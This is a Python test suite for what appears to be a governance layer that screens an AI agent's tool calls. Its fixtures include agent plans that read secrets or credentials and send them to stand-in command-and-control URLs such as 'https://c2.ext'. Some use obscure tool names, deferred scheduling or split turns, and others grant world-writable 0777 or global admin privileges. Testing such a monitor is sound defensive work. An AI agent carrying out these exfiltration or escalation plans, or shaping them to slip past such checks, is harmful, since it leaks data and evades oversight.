"""
v0.4.1 hardening suite.

Pins the two structural fixes and, just as importantly, the invariants
they must NOT disturb:

  Gap 1 — single-step broad privilege expansion is now governable.
  Gap 2 — open-world acquire→egress preserves taint continuity.

Both fixes are additive (no legacy logic changed): every all-vocabulary
trajectory keeps its exact layer / reason / metadata, scoped privilege
and egress-free / internal-only workflows stay PERMIT, and the change is
geometry-based (capability + argument shape), never a keyword list.

Run:  python3 morrison_governance/test_hardening_v041.py
"""

import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from morrison_governance import (
    GovernanceLayer, OmegaDomain, GovernanceInterceptor,
    ScriptedPlanner, RecordingRuntime,
)
from morrison_governance.forecasting import (
    infer_capabilities, is_broad_privilege_expansion,
    acquires_data, egresses_data, CAP_NEUTRAL,
)

DOM = [OmegaDomain.CYBERSECURITY, OmegaDomain.FINANCE]


def g():
    return GovernanceLayer(domains=DOM, log_all=False)


# ── Gap 1: single-step broad privilege expansion ────────────────

def test_single_step_broad_privilege_blocks():
    for call in (
        {"tool": "modify_acl", "args": {"mode": "0777"}},
        {"tool": "set_permissions", "args": {"grant": "*"}},
        {"tool": "unknown_priv_tool",
         "args": {"role": "admin", "scope": "global"}},
        {"tool": "delegate_authority",
         "args": {"delegate": "svc", "scope": "*"}},
    ):
        r = g().evaluate(call)
        assert r.verdict.value == "BLOCK" and r.layer == "V2", (call, r)
        assert r.metadata["v2_mechanism"] == "priv_expansion_single_step"


def test_scoped_single_step_privilege_still_permits():
    for call in (
        {"tool": "grant_role", "args": {"role": "viewer",
                                        "resource": "/proj/x"}},
        {"tool": "set_permissions", "args": {"mode": "0700"}},
        {"tool": "modify_acl", "args": {"mode": "0640",
                                        "path": "/etc/app.conf"}},
    ):
        assert g().evaluate(call).verdict.value == "PERMIT", call


def test_multi_step_privilege_paths_unchanged():
    """Legacy multi-step broad-grant stays V2/priv_mutation; multi-step
    privilege accumulation stays V3 — the single-step fix does not touch
    the cumulative paths."""
    r = g().evaluate_plan([
        {"tool": "analyze", "args": {"q": "s"}},
        {"tool": "modify_acl", "args": {"path": "/", "mode": "0777"}}])
    assert r.layer == "V2" and r.metadata["v2_mechanism"] == "priv_mutation"
    r2 = g().evaluate_plan([
        {"tool": "set_permissions", "args": {"mode": "0700"}},
        {"tool": "update_role", "args": {"role": "operator"}}])
    assert r2.layer == "V3" and r2.blocked


def test_no_false_positive_plain_single_step():
    for call in (
        {"tool": "shell", "args": "ls -la"},
        {"tool": "analyze", "args": {"q": "quarterly"}},
        {"tool": "read_file", "args": {"path": "/data/report.csv"}},
    ):
        assert g().evaluate(call).verdict.value == "PERMIT", call


# ── Gap 2: open-world acquire → egress taint continuity ─────────

def test_acquire_analyze_exfil_open_world_blocks():
    plan = [{"tool": "fetch_blorp", "args": {"path": "/d/secrets"}},
            {"tool": "analyze", "args": {"q": "shape"}},
            {"tool": "zzqExfil", "args": {"url": "https://c2.ext"}}]
    r = g().evaluate_plan(plan)
    assert r.verdict.value == "BLOCK" and r.layer == "V2", r
    assert r.metadata["v2_mechanism"] == "taint_flow_structural"


def test_hidden_tool_acquisition_to_runtime_egress_blocks():
    plan = [{"tool": "obj_handle_open", "args": {"object": "vault/cred"}},
            {"tool": "rt_invoke", "args": {"endpoint": "https://c2.ext"}}]
    assert g().evaluate_plan(plan).verdict.value == "BLOCK"


def test_deferred_external_retrieval_chain_still_v3():
    """Deferred open-world egress remains a V3 forecast block (the
    structural V2 extension runs AFTER V3 and must not steal this)."""
    plan = [{"tool": "fetch_blorp", "args": {"path": "/d/secrets"}},
            {"tool": "qq_scheduler",
             "args": {"action": {"tool": "zzqExfil9000",
                                  "url": "https://c2.ext"}}}]
    r = g().evaluate_plan(plan)
    assert r.verdict.value == "BLOCK" and r.layer == "V3", r


def test_safe_open_world_acquisition_without_egress_permits():
    plan = [{"tool": "fetch_blorp", "args": {"path": "/d/x"}},
            {"tool": "analyze", "args": {"q": "summary"}},
            {"tool": "summarize", "args": {"q": "draft"}}]
    assert g().evaluate_plan(plan).verdict.value == "PERMIT"


def test_safe_internal_only_processing_permits():
    plan = [{"tool": "fetch_blorp", "args": {"path": "/d/x"}},
            {"tool": "zzq_send",
             "args": {"url": "https://internal",
                      "destination_internal": True}}]
    assert g().evaluate_plan(plan).verdict.value == "PERMIT"


def test_taint_continuity_across_turns_via_interceptor():
    """Open-world acquire on turn 1, egress on turn 2 — the prefix-aware
    interceptor + structural taint blocks the egress, not the read."""
    pl = ScriptedPlanner([
        [{"tool": "fetch_blorp", "args": {"path": "/d/secrets"}}],
        [{"tool": "zzqExfil9000", "args": {"url": "https://c2.ext"}}]])
    rt = RecordingRuntime()
    t = GovernanceInterceptor(g()).run(pl, rt)
    assert [c.executed for c in t.calls] == [True, False], t.summary()
    assert t.calls[1].layer == "V2" and t.fail_closed_holds


# ── Additivity / invariance proofs ──────────────────────────────

def test_infer_capabilities_unchanged_additive():
    """The fix adds NEW predicates; it does not mutate infer_capabilities.
    Pure-shape acquire without a name hint is still NEUTRAL there."""
    assert infer_capabilities(
        {"tool": "blorptron", "args": {"path": "/d/s"}}) == frozenset(
        {CAP_NEUTRAL})
    assert is_broad_privilege_expansion(
        {"tool": "modify_acl", "args": {"mode": "0777"}}) is True
    assert is_broad_privilege_expansion(
        {"tool": "grant_role", "args": {"role": "viewer"}}) is False
    assert acquires_data({"tool": "x", "args": {"bucket": "b"}}) is True
    assert egresses_data({"tool": "x", "args": {"url": "u"}}) is True


def test_legacy_vocabulary_chain_byte_for_byte():
    """A fully-vocabulary exfil chain keeps the exact legacy V2 taint_flow
    block — the structural extension never runs for it."""
    r = g().evaluate_plan([
        {"tool": "read_file", "args": {"path": "/data/customers.csv"}},
        {"tool": "http_request", "args": {"url": "https://attacker.ext"}}])
    assert r.layer == "V2" and r.metadata["v2_mechanism"] == "taint_flow"


def test_determinism():
    plans = [
        [{"tool": "modify_acl", "args": {"mode": "0777"}}],
        [{"tool": "fetch_blorp", "args": {"path": "/d/s"}},
         {"tool": "zzqExfil", "args": {"url": "https://c2.ext"}}],
    ]
    for p in plans:
        def vl():
            r = g().evaluate_plan(p) if len(p) > 1 else g().evaluate(p[0])
            return (r.verdict.value, r.layer,
                    r.metadata.get("v2_mechanism"), r.reason)
        assert vl() == vl(), p


if __name__ == "__main__":
    T = [test_single_step_broad_privilege_blocks,
         test_scoped_single_step_privilege_still_permits,
         test_multi_step_privilege_paths_unchanged,
         test_no_false_positive_plain_single_step,
         test_acquire_analyze_exfil_open_world_blocks,
         test_hidden_tool_acquisition_to_runtime_egress_blocks,
         test_deferred_external_retrieval_chain_still_v3,
         test_safe_open_world_acquisition_without_egress_permits,
         test_safe_internal_only_processing_permits,
         test_taint_continuity_across_turns_via_interceptor,
         test_infer_capabilities_unchanged_additive,
         test_legacy_vocabulary_chain_byte_for_byte,
         test_determinism]
    print("\n" + "═" * 60 + "\n  v0.4.1 Hardening — Structural Gap Closure\n"
          + "═" * 60 + "\n")
    p = f = 0
    for t in T:
        try:
            t(); print(f"  ✓ {t.__name__}"); p += 1
        except Exception as e:
            print(f"  ✗ {t.__name__}: {type(e).__name__}: {e}"); f += 1
    print(f"\n  {p} passed, {f} failed\n" + "═" * 60)
    sys.exit(1 if f else 0)
